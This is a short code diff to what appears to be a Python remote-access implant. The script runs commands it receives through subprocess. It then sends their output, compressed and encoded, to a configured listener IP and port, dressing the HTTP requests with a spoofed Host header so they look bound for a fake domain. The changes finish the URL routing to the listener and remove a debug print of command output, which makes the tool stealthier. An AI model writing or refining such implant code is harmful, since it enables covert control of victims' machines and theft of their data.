@@ -7,6 +7,8 @@ import base64
 import os
 import subprocess
 import zlib
+import random
+import string
 from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME
 
 # Time in seconds to wait for a http response before a timeout occurs.
@@ -50,7 +52,7 @@ def get_random_url():
         query_string = ""
 
     # Construct the fake-looking URL (but with real IP and port)
-    return f"http://{base_ip}:{port}/{path}{query_string}", fake_domain
+    return f"http://{LISTENER_IP}:{LISTENER_PORT}/{path}{query_string}", fake_domain
 
 
 def compress_and_encode_string(string: str):
@@ -99,7 +101,7 @@ def send_stego_data_to_listener(data: str):
     }
 
     # Generate fake URL and fake domain
-    url, fake_domain = create_random_url(LISTENER_IP, LISTENER_PORT)
+    url, fake_domain = get_random_url()
 
     # Add a Host header to make the request look like it's going to the fake domain
     headers["Host"] = fake_domain
@@ -140,7 +142,6 @@ def execute_command_line_input(input: str):
     else:
         # Execute the command and retrieve the output (might be an error message if command couldn't execute)
         output = subprocess.getoutput(input)
-        print(f"OUTPUT: {output}")
     return output
 
 
